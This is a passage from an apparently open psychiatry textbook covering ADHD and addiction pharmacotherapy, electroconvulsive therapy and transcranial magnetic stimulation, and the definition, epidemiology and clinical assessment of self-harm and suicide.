no protective effect from treatment.  This is controversial however as ADHD is considered to be a risk factor for substance abuse; other data regarding treatment of ADHD as a way to decrease the risk of substance abuse is mixed.(Wilens, 2004; Wilens, Faraone et al. 2003)
	
Stimulants have also been historically used in the treatment of anergic medically ill, mildly depressed, often elderly patients.  Response can often be noted in a matter of days.  There is no evidence however that these medications are effective antidepressants in other patients with major depression.(Satel and Nelson, 1989)

===Non-Stimulant Medicines for ADHD===
	
Atomoxetine is a norepinephrine and dopamine reuptake inhibitor (Bymaster, Katner et al. 2002) which has shown efficacy in, and has been primarily marketed for, the treatment of ADHD.(Michelson, Adler et al. 2003)  As might be expected by its mechanism of action, it may also have antidepressant effects but there are no published data to support its use in the treatment of depression.  Unlike stimulants which can rapidly improve ADHD symptoms, atomoxetine requires several weeks of treatment before response occurs.  Response is generally less robust than with stimulants.  Atomoxetine may cause increases in blood pressure, insomnia and possible weight loss.  It is not associated with abuse or dependence.
	
In adults, other agents with noradrenergic and/or dopaminergic effects may be helpful in the treatment of ADHD symptoms, although again response is generally weaker than that expected from stimulants.(Meszaros, Czobor et al. 2007)  These include bupropion (Wilens, Spencer et al. 2001), tricyclic antidepressants (especially the more noradrenergic desipramine and nortriptyline), (Higgins, 1999; Prince, Wilens et al. 2000; Wilens, Biederman et al. 1996) venlafaxine (Popper, 1997), modafinil (a wakefulness-promoting drug with unknown mechanism of action)(Biederman, Swanson et al. 2006) and clonidine.(Connor, Fletcher et al. 1999)  SSRIs and antipsychotics are not effective in the treatment of ADHD.
	
Table 5 summarizes characteristics of selected ADHD medications.(Hyman, Arana et al. 1995; Rosenbaum, Arana et al. 2005; PDR, 2008; Stahl, 2005; Taylor, Paton et al. 2007)  Antidepressants used in the treatment of ADHD are listed in Table 1.

==Treatments for substance abuse/dependence==
	
The past few decades have seen a dramatic increase in the number of pharmacological options available for the treatment of substance abuse disorders.  Pharmacotherapeutic treatments are now available for the treatment of opioid dependence, alcohol dependence and nicotine dependence.  Detailed algorithms for the use of pharmacotherapy in addiction disorders may be found at the website of the International Psychopharmacology Algorithm Project (www.ipap.org).  The medical treatment of withdrawal states that emerge upon substance discontinuation are not covered in this chapter, but have been reviewed elsewhere.(Rosenbaum, Arana et al. 2005; Taylor, Paton et al. 2007)  In treating patients with substance abuse, the beneficial effects of psychosocial interventions should not be overlooked.(Dutra, Stathopoulou et al. 2008)

===Medications for Opioid Dependence===
	
Methadone, a synthetic opioid mu-receptor agonist, is a long-acting analgesic that has shown efficacy in maintenance therapy for patients with a history of opioid dependence.  Although methadone (at relatively low doses) can be prescribed as an analgesic by individual physicians in the United States, methadone for the treatment of heroin dependence can only be dispensed by centers registered and authorized to do so by regulatory agencies.  The methadone dose is gradually increased over many months in patients attending these centers until a dose (of usually 90-120 mg/day or higher) is reached that stops cravings for illicit opiates and stops drug seeking behaviors.(Faggiano, Vigna-Taglianti et al. 2003)  Methadone can cause respiratory depression (especially in patients who are not tolerant to opioids), additive CNS effects with concurrent use of other sedatives, QT prolongation(Ehret, Voide et al. 2006) and constipation.  Levomethadylacetate (LAAM) is similar to methadone except with a longer half-life requiring less than daily administration, but it has been discontinued due to reports of it causing torsades de pointes arrhythmias.
	
Physicians should be aware that patients maintained on high dose methadone who are admitted to the medical/surgical wards of hospitals for unrelated medical care are likely to need to continue their daily dose of methadone.  However, high doses should never be administered without independent confirmation with the methadone center administering this drug to confirm the actual dose that the patient has been receiving prior to admission.  Even 3-4 days of methadone discontinuation may significantly reduce patients' tolerance to the respiratory effects of this drug.   To decrease the risk of death from respiratory depression, a single dose of methadone should never exceed 20 mg when independent confirmation of higher doses is not possible.  Subsequent dose increments can then be added as necessary and as tolerated.
	
Buprenorphine is an opioid mu-receptor partial agonist (with very high affinity for this receptor) that is used as an alternative to methadone for maintenance therapy in opioid dependence.(Fudala, Bridge et al. 2003)  In the United States it can be prescribed in an office-based setting (for example with weekly counseling and weekly dispensing)(Fiellin, Pantalon et al. 2006) without requiring daily administration in a methadone center.  Buprenorphine is less dangerous than methadone in overdose with a lower risk of respiratory depression.  Concurrent use of benzodiazepines or alcohol however significantly increases the risk of death from respiratory depression(Megarbane, Hreiche et al. 2006; Kintz 2001); therefore patients with a history of polysubstance abuse may not be good candidates for buprenorphine maintenance therapy.  When used in outpatient treatment buprenorphine is combined with the opioid antagonist naloxone and administered sublingually.  In sublingual form the buprenorphine is absorbed while the naloxone is not.  When absorbed through the GI tract, naloxone undergoes extensive first-pass liver metabolism decreasing its systemic availability.  Naloxone is added to discourage intravenous abuse of this medication: if this combination is misused intravenously, the naloxone effect predominates and blocks any opioid effect.  Buprenorphine may also be beneficial in chronic pain patients who are at risk of opioid dependence; higher doses may be needed when buprenorphine is used as an analgesic.

===Medications for Alcohol Dependence===
	
Disulfiram, one of the earliest treatments developed for addictive disorders, acts by producing unpleasant physical effects if alcohol is concurrently consumed.  It disrupts ethanol metabolism by irreversibly inhibiting aldehyde dehydrogenase, thereby leading to a significant accumulation of ethanol metabolite acetaldehyde which is associated with severely unpleasant adverse effects (and cardiac stress).  Although there is no evidence that it helps maintain abstinence over the long run, it may be useful as a disincentive to ethanol use in the short term.(Suh, Pettinati et al. 2006)  It retains its effect on aldehyde dehydrogenase for up to 2 weeks, so even if the patient stops taking disulfiram and plans to drink, there may be time to reconsider and enlist other supportive mechanisms to maintain sobriety before it loses effectiveness.  Ultimately however, most patients who wish to drink do so by discontinuing disulfiram, and many drink while still on it, placing themselves at severe risk.  Therefore, like all pharmacotherapies for ethanol dependence, external supports (such as family supervision of medication adherence) and nonpharmacological therapies (such as ongoing counseling and behavioral therapies) are needed for continued effectiveness.(Lingford-Hughes, Welch et al. 2004; Hughes and Cook, 1997)  Notably, however, a recent randomized comparison of disulfiram, acamprosate and naltrexone (discussed below) in 243 patients, all of whom received brief cognitive-behavioral psychotherapy, showed disulfiram to be more advantageous than the other agents.(Laaksonen, Koski-Jannes et al. 2008)
	
Patients who are beginning disulfiram treatment should be informed of possible medication interactions and the need for avoidance of alcohol in foods (e.g., sauces) and topical preparations (e.g., perfumes).  Disulfiram is not recommended for patients with cardiac disease, significant liver disease, peripheral neuropathy or psychosis.
	
Acamprosate may increase the number of abstinence days and decrease overall alcohol consumption long-term in alcohol dependent patients.(Boothby and Doering, 2005; Sass, Soyka et al. 1996; Whitworth, Fischer et al. 1996; Mann, Lehert et al. 2004; Kranzler and Van Kirk, 2001)  Its mechanism of action is unclear although it is thought to involve the enhancement of GABA transmission and possibly the antagonism of the excitatory neurotransmitter glutamate.(Littleton and Zieglgansberger, 2003)  It is generally well-tolerated, with mild GI symptoms as the most commonly seen adverse effects.  It is renally excreted and may be administered to patients with liver disease.  Recent evidence from a large multicenter study, however, has shed doubt on the effectiveness of acamprosate (Anton, O'Malley et al. 2006)—see below.
	
Naltrexone is an opioid receptor antagonist.  Alcohol can increase the release of endogenous opioids in the brain which may contribute to its euphoric effects.  Naltrexone may reduce this opioid-mediated aspect of alcohol's reinforcing properties, and modestly reduce alcohol use in dependent patients.(Anton, 2008; Srisurapanont and Jarusuraisin, 2005)  It appears to be most beneficial in severe alcoholics.(Pettinati, O'Brien et al. 2006)  A long-acting (i.e., every 4 weeks) injectable preparation is also available.(Garbutt, Kranzler et al. 2005; O'Malley, Garbutt et al. 2007)  Naltrexone may cause mild GI symptoms and an infrequent transaminitis that requires monitoring.  Patients on naltrexone must not be given opiates for pain management: overdose and death can result from the high opiate doses needed to override the effect of naltrexone.
	
Some studies have suggested superior efficacy of naltrexone as compared to acamprosate.(Anton, O'Malley et al. 2006; Morley, Teesson et al. 2006; Rubio, Jimenez-Arriero et al. 2001)  The recent U.S. government-sponsored COMBINE study which compared naltrexone vs. acamprosate vs. the combination of the two, all combined with medical management (i.e., brief meetings with a healthcare provider modeled on a primary care setting), found naltrexone to be more effective than acamprosate.  It also found that the meetings with a healthcare provider increased the likelihood of abstinence.(Anton, O'Malley et al. 2006)  It should be noted that the dose of naltrexone used was twice the usual maximum dose (100 mg/day vs. 50 mg/day).  Individuals with a specific polymorphism of the mu-opioid receptor gene (OPRM1), i.e., individuals with an Asp40 allele—coding for a receptor with increased beta-endorphin binding and activity(Bond, LaForge et al. 1998)—may be more likely to respond to naltrexone.(Anton, Oroszi et al. 2008) 

Off-label use of naltrexone may also be considered in opioid dependent patients—where higher doses are usually needed—if there are significant external supports and motivation to ensure adherence to this medication.(Kirchmayer, Davoli et al. 2003)  Highly motivated addicted physicians and other professionals are examples of patients who may benefit from naltrexone treatment for opiate dependency.(Ling and Wesson, 1984; Washton, Gold et al. 1984)

===Other Medications for Alcohol Dependence===
	
There is recent evidence to support the use of the anticonvulsant topiramate for the treatment of alcohol dependence.(Johnson, Ait-Daoud et al. 2003; Johnson, Rosenthal et al. 2007)  Ondansetron, an antiemetic with 5HT3 serotonin receptor antagonist activity, has also emerged as an agent with possible efficacy for this indication.(Johnson, Ait-Daoud et al. 2000; Johnson, Roache et al. 2000)  The antidepressant mirtazapine is also a 5HT3 antagonist but has not been studied for this indication.

===Medications for Nicotine Dependence===
	
Nicotine replacement therapy is used to decrease withdrawal symptoms during smoking tapering and cessation and can double the odds of quitting.(Silagy, Lancaster et al. 2004)  Nicotine replacement can be delivered transdermally via a patch, or by gum, oral inhaler, nasal spray or dissolving lozenge.  All modes of delivery are likely to be effective(Silagy, Lancaster et al. 2004)  Actual dosing and duration of treatment vary slightly for each formulation, although all nicotine replacement treatments involve setting a target date for smoking cessation followed by a gradual taper of the nicotine over 2-3 months.  In a review of 88 trials, success rates on 6-12 month follow-up averaged 16% vs. 10% on placebo.(Silagy, Mant et al. 2000)  Patients should therefore be encouraged to make repeated efforts to quit.  Caution should be used in patients with a history of cardiac disease, especially when using the nicotine patch (avoid the patch if there is a history of serious arrhythmias, angina or immediately post-MI).  Patients should not smoke at all while wearing the transdermal nicotine patch.  Nausea and headaches can occur frequently with nicotine replacement therapy.
	
Bupropion, an antidepressant with possible dopaminergic effects (see section on antidepressants), is also efficacious for smoking cessation.(Jorenby, Leischow et al. 1999)  Bupropion should be started two weeks before the target stop date and then continued for at least 3 months.  The addition of nicotine replacement therapy to bupropion can increase the chances of abstinence compared to the use of either drug alone.(Jorenby, Leischow et al. 1999)
	
Varenicline is an alpha4beta2 nicotinic acetylcholine receptor partial agonist, with high affinity for this receptor.  It is the latest advance in nicotine addiction treatment.  It may have effectiveness that is comparable to, or greater than that of bupropion for smoking cessation.(Gonzales, Rennard et al. 2006; Jorenby, Hays et al. 2006; Tonstad, Tonnesen et al. 2006)  Although varenicline appears to be generally well-tolerated, treatment-emergent mood changes and psychosis have been reported in susceptible patients.(Freedman, 2007; Kohen and Kremen, 2007)  Because of its cost it is often restricted by pharmacy benefit managers to patients who have failed nicotine replacement and bupropion therapy.
	
Table 6 summarizes the characteristics of medications used for substance abuse/dependence disorders.(WHO, 2007; PDR, 2008; Hyman, Arana et al. 1995; Rosenbaum, Arana et al. 2005; Stahl, 2005; Taylor, Paton et al. 2007)

== Conclusion ==
	
Over the last five decades, multiple medications have become available for the treatment of patients with psychiatric disorders.  TCAs, MAOIs, SSRIs, SNRIs and others antidepressants have expanded current treatment options for depressive and anxiety disorders.  Anxiolytics, including benzodiazepines and non-dependence-producing alternatives, are available for the treatment of severe anxiety disorders.  First and second generation antipsychotics with different receptor profiles and side effect profiles have expanded the choices for patients with psychotic disorders.  Lithium and other medications with mood stabilizing properties are available for use in patients with bipolar disorder.  New formulations of stimulants and non-stimulant agents can be used in adults with attention-deficit/hyperactivity disorder.  Finally, pharmacological therapies for the treatment of substance abuse and dependence disorders have been greatly expanded in recent years.
	
Medical students and physicians should become familiar with these medications and obtain some facility in using them.  As always, the science and art of medicine comprise the ability to appropriately and carefully apply that which is learned in textbooks to a specific patient.  In the clinical setting, pharmacotherapeutic treatments should be used judiciously: the risks and benefits of treatments should be considered so that every effort is made to &quot;first do no harm.&quot;  One should employ the strategy of using one medication at a time, so as to have the opportunity to know what is actually working and not working.  The goal is to provide relief and lessen suffering, preferably in the most evidence-based and cost-effective manner possible.  Finally, students and clinicians should keep in mind that for pharmacotherapeutic interventions to be successful there must also be appropriate psychosocial support and treatment.  Only then can safe, effective, and comprehensive treatment be provided.

      <text xml:space="preserve">Neurostimulation or brain stimulation techniques have been used for many years with the hope that they can help alleviating symptoms of mental disorders.  Generally, neurostimulation techniques can be defined as using a variety of different methods of stimulating the brain.  In the past, there have been a variety of methods used, which are no longer used such as Cardiazol Shock Therapy, Insulin Coma Therapy, etc.  Sometimes these treatment methods are referred to as biological treatment, as opposed to psychological treatment (psychotherapy) or pharmacological therapy (psychopharmacological agents).

In this chapter, we will look in more detail at Electroconvulsive Therapy and Transcranial Magnetic Stimulation.

==Electroconvulsive Therapy==

Electroconvulsive Therapy (ECT) is a well-established treatment method for psychiatric disorders.  A convulsion (seizure) is induced by the application of electrical current to the brain by using 2 electrodes.  The position of the electrodes is important and the most commonly used positions currently are (1) bilateral position, where the electrodes are placed symmetrically on both sides of the head.  It can further be subdivided to (a) bitemporal placement when the 2 electrodes are positioned on both temporal areas and (b) bifrontal positioning where the electrodes are positioned on the forehead.   (2) The electrodes can also be positioned only on the one side of the skull, thus stimulating only 1 hemisphere of the brain.  Usually this is the right side and hence right unilateral (RUL) position.

===Stimulus parameters===

In the past, current with sine wave was widely used.  More recently in the last 20-30 years, this has been modified to monophase brief pulse electrical current.

There are several parameters of the electrical stimulus, which are important.  Current is measured in ampers and the most commonly used range is between 500 to 800 milliampers.  Frequency of the brief pulse is typically anywhere between 20 to 120 Hz (pulse/sec).  Individual pulse width varies usually between 0.25 to 2 msec.  The duration of the stimulus is usually between 0.25 to 8 seconds or more.  The total charge of electricity delivered at one stimulation is measured in coulombs and it is derived by the combination of different stimulus parameters.  Most ECT machines can deliver a charge up to 1,000 millicoulombs or more, although the machines sold in the USA and Canada are usually limited to below 600 millicoulombs.  The actual energy delivered depends on the charge and impedance; it is measured in jolts.  

Another important parameter is the so-called seizure threshold.  Seizure threshold is defined as the minimal charge (combination of individual parameters) able to produce a seizure.  Once the threshold is established, the actual stimulus can be delivered at low dose (at seizure threshold), moderate dose (1.5 times seizure threshold), high dose (2 times seizure threshold) or even at suprathreshold (5 to 6 times seizure threshold).

===Muscle Relaxation and General Anaesthesia===

In order to reduce the possible traumas and injuries from the convulsion (seizure), a muscle relaxant medication has been widely used in order to partially paralyse the large muscles in the body.  As this paralysis may be associated with significant fear and an anxiety response, the use of short acting general anaesthesia has been incorporated into the treatments.

===Frequency of Treatments and Number of Treatment Sessions===

The usual number of treatments per week is 2 to 3 and there does not appear to be any significant difference between the two schedules.  There might have been suggestion that treatments delivered 3 times per week may be associated with faster response, but with more side effects, and this could be used by individual practitioners in order to make determination of the actual frequency.  Treatments delivered every day and even more than 1 treatment per day are virtually no longer used.  If there are significant cognitive side effects, some practitioners would reduce the frequency down to 1 treatment a week.

The total number of treatments varies widely but is generally regarded that a course of treatment is usually between 6 and 12 or more treatment.

===Efficacy=== 

In the past, response rates of 80% or higher have been reported in treatment of naive patients.

In direct comparisons with older antidepressant medication, ECT has consistently delivered better response rates.  There is lack of evidence comparing ECT directly with newer antidepressant medications such as SSRIs or SSNRIs and others.

The efficacy of ECT is strongly related to its’ stimulation parameters and there is consistent evidence for that. Bitemporal placement is generally regarded as more effective than unilateral, but seems to be associated with more cognitive side effects.  More recently, there has been some evidence that right unilateral placement at suprathreshold stimulus dose is at least as effective as bilateral stimulation but is associated with fewer side effects.  Meta-analysis suggests that bitemporal ECT associated with greater acute cognitive side effects compared to right unilateral ECT.  Bifrontal placement of the electrodes has been less frequently evaluated.  There are some reports suggesting that bifrontal placement of electrodes is as effective as bitemporal or right unilateral but is associated also with less cognitive side effects.  It also appears that shorter pulse width and/or lower pulse frequency may have also lower seizure thresholds.

===Indications for Use===

ECT is currently used in the treatment of Major Depressive Disorder, Mania, Schizophrenia and Catatonia.  

====Use in Major Depressive Episodes/Disorders==== 

Considerations for ECT as a first choice treatment for Major Depressive Episodes or Disorder are usually after a serious suicidal attempt or a very strong acute suicidal ideation.  It can be considered also with severe depression with psychotic features in rapidity deteriorating physical status due to refusal of food and fluids.  Sometimes patients who have responded well to previous ECT treatments would request that ECT is used as first choice and this should be taken into consideration as well.

The main use for ECT in Major Depressive Disorder is for treatment resistant depression after a lack of response to other treatment methods.  It has been also well established that ECT is a safe and effective for treatment of depression during pregnancy.

====Use of ECT in Other Conditions====

ECT has been used in treatment resistant Mania.  It could be used in Schizophrenia, which is resistant to Clozapine, and also in acute Catatonia.  There have been case reports in the treatment of other conditions as well.

====Contraindications for ECT Treatment====

There are relatively very few absolute contraindications for ECT treatment and these are associated with increased intracranial pressure and space occupying lesion.  Recent cardiovascular event is also a relative contraindication.  A consultation with an internal specialist and/or anesthesiologist may be required in such cases.

===Side Effects===

ECT is a safe procedure with very low mortality rate calculated as 0.2 per 100,000 treatments approximating the risk of general anesthesia.  The side effects are short term and include nausea, headaches, muscle pain, dental injuries and oral lacerations and myalgia.  They seem to be short lived and respond to symptomatic treatment.

Of much more concern are the cognitive side effects and transient confusion has been reported.  Anterograde and retrograde amnesia, word finding difficulties and deficits in  memory may continue for longer periods of time.  It seems that reducing the frequency of treatment from 3 to 2 times per week, the use of brief pulse rather than sine wave ECT machines, right unilateral or bifrontal positions of the electrodes instead of bitemporal and lower dose stimuli might reduce the frequency and intensity of cognitive side effects.  

Allegations that ECT may cause brain damage have been consistently refuted.  In fact, it seems that ECT may stimulate an increased production of neurotrophic growth factors such as brain derived neurotrophic factor (BDNF) causing migration and proliferation of progenitor cells and growth of new neurons in the hippocampus.  These findings are consistent with evidence of similar effects of various other antidepressant treatments and may be the final common pathway of the antidepressant effects.  

ECT has a very negative perception by the general population, due in part of its portrayal in works of art, e.g., Oscar Winning &quot;One Flew Over the Cuckoo’s Nest.&quot;

==Repetitive Transcranial Magnetic Stimulation ==

===Introduction===

Repetitive Transcranial Magnetic Stimulation (rTMS) is a newer stimulation technique used for research and in clinical practice in the last 10 to 15 years.  It involves the application of strong magnetic field, which penetrates through the skull (hence transcranial) and superficially the brain, producing some local electrical current.  These electric currents affect the functioning of neurons.  The magnetic fields are the magnitude of 1.5 to 2.5 TESLA and are generated when electrical current is passed through a coil (electromagnetic induction).

The coils currently used for rTMS are usually of 2 types, round and figure 8 (butterfly) shaped.  The figure 8 coils seem to be able to produce a stronger and more focal magnetic field compared to the round coil and is becoming more widely used.  The stimuli delivered are repetitive and fall into 2 types: (1) low frequency rTMS, which is usually regarded for stimuli at or below 5 Hz.  The lower frequency stimuli appear to produce transient reduction in cortical excitability at the area stimulated. (2) High frequency rTMS is a TMS at 5 Hz or more, usually 10 to 20 Hz.  The high frequency TMS seems to increase the neuronal excitability at the area stimulated.

The actual stimuli are delivered in trains, which last several seconds, followed by inter-train intervals.  Many consecutive trains can be delivered at each session.  Sessions are delivered usually daily to 5 sessions per week.  Earlier reports of rTMS evaluated the effects of 10 sessions (given over 2 weeks), but more recent trials have been between 4 and 6 weeks in duration.  There are some further variations of the frequency sessions and sometimes they can be delivered in 2 sessions per day or 1 session every 2nd or every 3rd day.  At the beginning of each treatment, the motor threshold is established.  The motor threshold is defined as the minimal intensity of the stimulus able to produce muscle twitches in the contralateral abductor policis brevis.  Subsequently, the intensity is set usually between 90 and 120% of this threshold. 

Target areas to be stimulated are most commonly left or right dorsolateral prefrontal cortex (DLPFC).  The use of rTMS has been mainly studied in the treatment of depression and the most evidence is for treatment of the left or right dorsolateral prefrontal cortex.  The most evidence of successful treatment in depression is established to be occurring with stimuli with high frequency, rTMS on the left dorsolateral prefrontal cortex, although studies with low frequency right dorsolateral prefrontal cortex and different combinations of the two have also been studied.

Unlike ECT, the delivery of rTMS does not produce seizures and the patient remains alert through the treatment.  There is no need of anaesthesia or any other additional interventions.  rTMS seems to have a more positive view from the lay public compared with ECT.  There is also evidence that rTMS is producing much less cognitive side effects than ECT, if any.  

===Efficacy===

There has been some controversy about the efficacy of rTMS in Depression where it has been mostly studied.  Since the first case report in 1993, there have been many open label and randomized double blind controlled trials evaluating the effect of rTMS for treatment of Depression.  A direct comparison of separate studies is difficult because of great variability of the stimuli parameters used and also of various methodologies.  Earlier meta-analyses were not very convincing, but most recently with accumulation of more and larger studies, it has been shown that rTMS is an efficacious and safe, well tolerated treatment for depression. 

rTMS has been used for treatment resistant Depression and a recent meta-analysis has found that both response and remission rates are significantly better in the active treatment group compared with placebo, although they have been usually lower than other methods for treatment resistant depression.  Interestingly, it seems that the more recent studies are able to find higher response and remission rates in general.  This could be explained by the improvement and the precision of site administering of the stimulus and the increase of the number of treatment sessions.

There is limited information about direct ECT vs. rTMS comparisons, but the existing data seems to show some superiority of ECT, unfortunately at the price of higher frequency of cognitive side effects.  

Like ECT, rTMS has been shown to be followed by a high percentage of relapse after the acute treatment.  In many centres, some form of continuation and/or maintenance rTMS has been occasionally offered, but there is no systematic evaluation of these approaches.  

As mentioned above, the rTMS has been studied mainly in patients with Depression in either Major Depressive Disorder or Bipolar Disorder.  It appears as though the patients who had a more severe disorder may be better candidates for treatment with rTMS but, at the same time a higher level of previous treatment resistance is a negative predictor of future response.  A variety of studies have shown also some good response of patients who suffer from Depression co-morbid with Parkinson’s Disorder, pain conditions and vascular Depression and also late-life Depression.

===Side Effects and Tolerability===

rTMS seems to be well tolerated and there have not been that many side effects reported.  The most common side effect is pain in the site of stimulation, headaches, which usually respond easily to conventional symptomatic treatments.  Concerns about hearing loss due to the loud clicking noise produced by the machine have been addressed through use of earplugs with 30 decibels protection during the treatment, by both patients and treating staff.

There have been a dozen case reports of seizures occurring during rTMS so far worldwide.  Many of these seizures are due to underlying neurological conditions.  With good screening and restriction of the intensity of the rTMS stimuli, this can be largely avoided.

===Contraindications===

Absolute contraindications include the presence of aneurysm clips, cranial implants, brain stimulators or electrodes or any other devices made of ferromagnetic material in the head with the exception of the mouth.  Increased intracranial pressure, epilepsy, severe cardiovascular disease and other medical conditions are also contraindicated.  Cardiac pacemakers are NOT contraindicated!!!  As there is no data of the effects of strong magnetic field on the fetus, rTMS is contraindicated in pregnancy.

In conclusion, both ECT and rTMS are useful addition to the treatment armamentarium for depression and other conditions.

      <text xml:space="preserve">Self harm is commonly used by psychiatrists and mental health professionals to describe a wide variety of behaviors that may or may not be related to suicide. Both self harming behaviors and suicide permeate society around the world and across demographics. Suicide is defined as self inflicted death with evidence that the person intended to die according to APA practice guidelines. Self harm is more difficult to define because its causes are poorly understood and the spectrum of behaviors can vary widely between individuals and between cultures. Behaviors commonly included in the self harm spectrum include overdoses, self battery, cutting, burning, poisoning, hanging and jumping from high places that do not result in death (Skegg, 2005). Suicide ultimately results in intentional self-inflicted death and self harm may lead to suicide.

The APA practice guidelines define terms related to self harm and suicide as the following:

'''Suicide''' self inflicted death with evidence that the person intended to die
 
'''Suicide attempt''' self injurious behavior with a nonfatal outcome and evidence that the person intended to die 
Aborted suicide attempt-potentially self injurious behavior with evidence that the person intended to die but stopped before physical damage occurred 

'''Suicide ideation'''
thoughts of serving as the agent of one’s own death 

'''Suicidal intent''' subjective expectation and desire for self-destructive act to end in death 

'''Lethality''' objective danger to life associated with suicide action or method 

'''Deliberate self harm''' willful self-infliction of painful, destructive or injurious acts without intent to die

Both of these phenomenons are important to clinicians to understand and be aware of because of their prevalence in the mental health patient population. An estimated 4.3 to 17% of the psychiatric patient population will engage in deliberate self-harm, with higher rates in some subgroups (Fliege, 2006). Self-harm and suicidal behaviors pose a significant public health burden and utilize a tremendous amount of hospital resources (Sinclar, 2006). Up to 40% of people who deliberately harm themselves will go on to become repeat offenders (Zahl, 2004).
Treatment of chronic self-harmers can be frustrating to the treatment team due to the poorly understood nature of the behavior and high rates of repeat admissions. Many patients are managed in emergency departments or do not seek treatment after performing these behaviors. Management depends largely on the underlying pathology and controlled trials of therapies are limited (Skegg, 2005).

==Phenomenology==

Naming and classifying self-harm has been a topic of debate since the early 1900’s (Skegg, 2005; Mcalister, 2003). Different terms that have historically been used to delineate self-harm behaviors include attempted suicide, parasuicide, deliberate self injury and deliberate self poisoning. Terminology can vary in different parts of the world and imply intent. Recent literature suggests that many who self-harm do so without suicidal intent (Skegg, 2005).

Skegg describes self-harming behaviors in a 2005 review on a spectrum from self-harmful behaviors without visible injury to highly lethal traditional methods of suicide. Excessive exercise, denying oneself as punishment, stopping medication or deliberate recklessness fall on the end of this spectrum without visible injury. Self battery behaviors include head banging, self-hitting or hair-pulling. Self-injury with tissue damaging behaviors include self-biting, scratching, gouging, carving words or symbols into skin, sticking needles or pins into skin and interfering with wound healing. At the other extreme less lethal traditional methods of non-intentional suicide include overdose, recreational drug ingestion as self-harm, cutting and burning. Traditional highly lethal methods of suicide include hanging, shooting, jumping from a high place, poisoning, stabbing, electrocution and drowning.

When considering these behaviors on a spectrum, it is important to consider intent. Traditional risk assessments correlate lethality with suicidal intent, however in a sample of survivors of near-fatal self harm, only two-thirds of patients experienced suicidal thoughts prior to the event (Douglas, 2004). The current consensus view is that those who self harm, despite how seriously, believe that they will survive (Mcallister, 2003). It is important to consider, however, that patients who harm themselves are more likely to go on to commit suicide than those who do not.

==Epidemiology==

Rates of self-harm and suicide vary widely around the world and have historically been difficult to quantify because many people do not seek medical attention after attempts and discussion of such behaviors is sometimes considered socially taboo. Birth cohort studies show higher odds for self harm in people born in recent years. The WHO/EURO study of parasuicide showed lower rates in southern European areas compared to northern areas (Skegg, 2005). In the United States, African Americans are at lower risk for self harm than other ethnic groups. Self-harming behaviors are common in adolescents and an estimated 5-9% of Australian, US and English adolescents reported self-harm over a one year period (Skegg, 2005). Lifetime self-harm ranged from 13-30% in these samples of adolescents (Skegg, 2005).

Skegg (2005) correlated demographic variables with risk of self-harm behaviors. It is rare before pubery and becomes common through adolescence. Older people are at much lower risk for self harm. More women than men present to mental health facilities with complaints of self-harm. Separated and divorced people appear to have higher rates of self-harm than other populations. Low socioeconomic status, less education and living in poverty are also risk factors for self harm (Skegg, 2005).

Further studies investigating suicidal behaviors are necessary to better understand the phenomenon and to create prevention strategies. Using three national medical databases, the annual rate of nonfatal emergency department treated intentional self-harm events in 2002-3 was between 127.2 and 164.7 per 100,000 US population (Classen, 2006). However, these rates do not include behavior of individuals not seeking treatment or seeking treatment in other medical facilities.

==Clinical Symptoms and Classification ==

'''Vignette #1'''

Sue was a 25 year old female who presented to the emergency room with a 3cm laceration on her left wrist. The laceration was superficial but deep enough that it required sutures.  There were multiple other superficial lacerations that did not require sutures as well as multiple healed scars from previous lacerations all up and down her forearm.

After Sue’s wrist was sutured, she was evaluated by a psychiatrist for a possible suicide attempt. Sue revealed that she had been having a fight on the phone with her boyfriend and they had broken up. She denied any thoughts of suicide but rather said she was trying to reduce the tension and anger she felt about the situation. When asked about whether the self harm helped, she said it did release tension and therefore makes her feel more normal. She described it as a coping skill and did not see it as a problem behavior. She was discussing plans for going out with friends and maybe getting together with a boy who might want to be her new boyfriend.

Sue’s past history is significant for sexual abuse at age 5 years by a cousin who was living with the family for the summer. Sue said she had always been sad and depressed but she did not endorse enough symptoms to qualify for a major depressive disorder. She said that she has a history of getting more depressed whenever someone left her or told her she was not making them happy. That was when she would cut on herself. She was very clear that she did not intend to kill herself during those times although she endorsed the idea that she might be better off dead than alive.

Sue was deemed to be safe to go home. She was referred to therapy to work on the issues that caused her to use self harming behaviors for comfort.

===Assessment===

Assessment of suicide and self harming behaviors takes place in a variety of treatment situations. It is often evaluated during an initial meeting with a patient in the emergency setting or at an outpatient intake. On an inpatient ward, assessment of suicide and self harm should be completed prior to advancement in privilege level, passes and discharge. If changes in the patient’s presentation occur or if the patient begins to display evidence of suicidal or self harming thoughts, an assessment should be completed. The APA practice guidelines describe a thorough assessment of the suicidal patient.

During the interview, the psychiatrist obtains information about the patient’s psychiatric history, medical history and current psychologic state through direct question and collateral information. This enables the psychiatrist to make a risk assessment, determine the patient’s current level of safety, choose an appropriate treatment setting and develop a treatment strategy. Suicide scales can be used to supplement the interview, but should not be used as a substitute because they lack the predictive validity to take the place of a thorough interview (APA practice guidelines).

A suicide assessment should include evaluation of current suicidal state, consisting of thoughts and plans regarding suicide. Specific methods should be elicited, including perceived lethality and access to firearms. The presence of hopelessness, guilt and anhedonia should be determined as well as reasons that prevent the patient from carrying out suicide plans. It should also include current and previous psychiatric illnesses including mood disorders, psychotic disorders, substance use disorders and anxiety disorders. Personal and family history of suicide and self harm behaviors should be noted, as well as outcomes. An individual’s psychosocial state should be assessed to evaluate current stressors that could exacerbate suicidal behaviors, as well as cultural or religious beliefs that could be protective (APA practice guidelines).

It is important for the psychiatrist to collect as much information as possible regarding current suicidal or self harming behaviors. These include frequency and duration of thoughts, specific plans and preparation made to complete plans. Attention should also be given to prior attempts, including timing, intent, relation to substance use and outcome. If a specific method is identified as a current suicidal ideation, perceived lethality should be determined. Highly lethal and irreversible means with advance planning place an individual at increased risk. If firearms are involved, the psychiatrist should contact a friend or relative and have them removed from the patient’s home before release (APA practice guidelines).

===Pathogenesis===

The pathogenesis of self harm and suicidal behavior is complicated and multifactorial. Sourander et al. (2006) attempted to identify early factors correlating with self-harm behaviors in childhood and adolescents. In this longitudinal study, parents rated children on Childhood Behavior Checklist and adolescents and their parents rated psychopathology at ages 12 and 15. Psychopathology in the child, poor parental well-being and living in a broken home at age 12 correlated with deliberate self harm at age 15. School and problems with peer groups at age 12 correlated with ideations of self harm at age 15. Acts of deliberate self harm in pre-adolescences led to higher rates of future behaviors.
	
====Biological Factors====

